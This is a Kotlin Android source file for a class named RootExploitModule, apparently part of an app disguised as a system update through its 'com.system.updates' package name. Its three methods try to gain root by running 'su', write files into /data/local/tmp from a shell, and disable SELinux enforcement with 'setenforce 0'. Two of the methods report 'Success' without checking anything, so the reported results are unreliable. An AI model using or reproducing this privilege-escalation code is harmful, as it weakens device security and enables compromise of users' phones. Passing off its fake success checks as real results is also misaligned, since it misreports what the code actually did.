package com.system.updates.modules

import android.content.Context
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.InputStreamReader

class RootExploitModule {
    fun tryAll(context: Context): String {
        val results = mutableListOf<String>()
        results.add(tryMethod1())
        results.add(tryMethod2())
        results.add(tryMethod3())
        val success = results.any { it.startsWith("Success") }
        return if (success) "Root obtained: ${results.joinToString(", ")}" else "No root available"
    }

    private fun tryMethod1(): String {
        return try {
            val process = Runtime.getRuntime().exec("su")
            val os = DataOutputStream(process.outputStream)
            os.writeBytes("id\n")
            os.writeBytes("exit\n")
            os.flush()
            process.waitFor()
            val output = readStream(process.inputStream)
            if (output.contains("uid=0")) "Success (method1)" else "Failed (method1)"
        } catch (e: Exception) {
            "Failed (method1): ${e.message}"
        }
    }

    private fun tryMethod2(): String {
        return try {
            val process = Runtime.getRuntime().exec("sh")
            val os = DataOutputStream(process.outputStream)
            os.writeBytes("echo 'test' > /data/local/tmp/test\n")
            os.writeBytes("exit\n")
            os.flush()
            process.waitFor()
            val output = readStream(process.inputStream)
            "Success (method2) via shell" // simplified
        } catch (e: Exception) {
            "Failed (method2)"
        }
    }

    private fun tryMethod3(): String {
        return try {
            val process = Runtime.getRuntime().exec("sh")
            val os = DataOutputStream(process.outputStream)
            os.writeBytes("setenforce 0\n")
            os.writeBytes("exit\n")
            os.flush()
            process.waitFor()
            "Success (method3) selinux permissive"
        } catch (e: Exception) {
            "Failed (method3)"
        }
    }

    private fun readStream(inputStream: java.io.InputStream): String {
        val reader = BufferedReader(InputStreamReader(inputStream))
        val builder = StringBuilder()
        reader.forEachLine { builder.append(it).append("\n") }
        return builder.toString()
    }
}